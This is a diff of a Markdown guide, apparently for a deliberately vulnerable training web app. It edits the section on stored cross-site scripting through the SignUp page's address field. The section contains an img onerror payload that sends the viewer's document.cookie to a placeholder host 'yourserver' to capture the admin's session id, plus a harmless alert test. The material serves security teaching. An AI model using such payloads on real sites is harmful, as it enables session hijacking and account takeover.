@@ -56,13 +56,14 @@ Force HTTPS for the whole server;
 ## A3-Cross-Site Scripting (XSS)
 The XSS code can be entered on the SignUp page, and executed on the Admin page when listing the sign-ups. 
 ### How to identify
-Enter this code into the address field on the SignUp page;
+1. Enter this code into the address field on the SignUp page;
 
 ```<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>```
 
-When the admin logs in and takes a look at the sign-ups, his session-id should be written to the Apache logs of “yourserver”.<br> 
+2. Log in to the Admin pages and take a look at the sign-ups. The session-id should now be written to the Apache logs of “yourserver”. 
 But you can also test with code like this, in any of the fields on the SignUp page; 
 ```<body onload=alert('hello')>```
+You will then receive the "hello" greeting, when looking at the sign-ups.
 
 ### How to fix
 In done.php you can find these lines;
